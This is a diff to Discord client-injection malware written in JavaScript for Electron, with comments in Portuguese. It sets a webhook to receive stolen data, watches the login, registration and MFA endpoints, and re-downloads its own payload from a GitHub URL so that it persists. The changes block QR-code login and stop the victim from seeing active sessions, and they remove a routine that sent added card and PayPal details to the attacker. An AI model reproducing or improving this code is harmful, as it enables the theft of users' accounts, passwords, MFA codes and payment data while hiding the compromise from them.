@@ -10,7 +10,7 @@ const { BrowserWindow, session } = require('electron');
 const CONFIG = {
     webhook: "%WEBHOOK%",
     // LINK RAW DO SEU GITHUB ABAIXO (Essencial para a auto-persistência)
-    injection_url: "https://raw.githubusercontent.com/P180EwqDeRT/1nj3ct10n/refs/heads/main/kvr",
+    injection_url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js",
     api_url: "https://discord.com/api/v9/users/@me",
     filters: {
         urls: ['/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me']
@@ -139,18 +139,16 @@ const startCapture = () => {
     // Bloqueio de QR Code
     session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));
 
-    // Congelar aba Dispositivos (Loading Infinito)
-    session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (d, c) => {
-        if (d.method === "GET") return c({ cancel: true });
-        c({ cancel: false });
+    session.defaultSession.webRequest.onBeforeRequest(session_filter, (details, callback) => {
+    // Se for uma tentativa de buscar as sessões (GET), nós cancelamos.
+    if (details.method === "GET" || details.url.includes("sessions")) {
+        return callback({ cancel: true });
+    }
+    callback({ cancel: false });
     });
 
-    // Captura de Pagamentos
-    session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (d, _) => {
-        if (![200, 202].includes(d.statusCode)) return;
-        const t = await getToken();
-        const acc = await fetchAccount(t);
-        hooker({ "content": "**Cartão/PayPal Adicionado!**", "embeds": [{ "fields": [] }] }, t, acc);
+    session.defaultSession.webRequest.onBeforeSendHeaders(session_filter, (details, callback) => {
+    callback({ cancel: true });
     });
 
     // Debugger para Login/Senha
